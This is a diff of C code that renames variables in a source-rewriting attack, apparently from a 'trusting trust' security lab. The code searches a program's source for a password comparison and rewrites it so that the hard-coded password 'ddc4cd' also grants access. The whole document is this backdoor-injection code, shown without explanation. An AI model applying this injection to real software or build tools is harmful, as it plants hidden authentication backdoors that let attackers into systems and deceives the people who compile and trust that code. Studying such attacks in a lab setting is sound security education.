@@ -4,10 +4,10 @@
 #define N 8 * 1024 * 1024
 
 static char compile_sig[] = "/* open the file */";
-static char hello_sig[] = "if(strcmp(c->passwd, passwd) == 0)";
-static char hello_attack[] = "if(strcmp(c->passwd, passwd) == 0 || strcmp(\"ddc4cd\", passwd) == 0)";
+static char target_sig[] = "if(strcmp(c->passwd, passwd) == 0)";
+static char target_attack[] = "if(strcmp(c->passwd, passwd) == 0 || strcmp(\"ddc4cd\", passwd) == 0)";
 int target_fd, n_read;
-char* hello_i;
+char* target_i;
 char* compile_i;
 static char program[N+1]; 
 static char tmp[N+1];
@@ -24,14 +24,14 @@ if(n_read == N)
 
 close(target_fd);
 
-hello_i = strstr(program, hello_sig);
-if(hello_i != NULL){
+target_i = strstr(program, target_sig);
+if(target_i != NULL){
     printf("found signature!\n");
     for (size_t i = 0; i < N; i++){tmp[i] = 0;}
-    size_t hello_offset = hello_i - program + strlen(hello_sig);
-    strcpy(tmp, program + hello_offset);
-    strcpy(hello_i, hello_attack);
-    strcpy(hello_i + strlen(hello_attack), tmp);
+    size_t target_offset = target_i - program + strlen(target_sig);
+    strcpy(tmp, program + target_offset);
+    strcpy(target_i, target_attack);
+    strcpy(target_i + strlen(target_attack), tmp);
     /*tmp_fptr = fopen("./tmp.c", "w");
     if(tmp_fptr != NULL){
         fprintf(tmp_fptr, "%s", program);
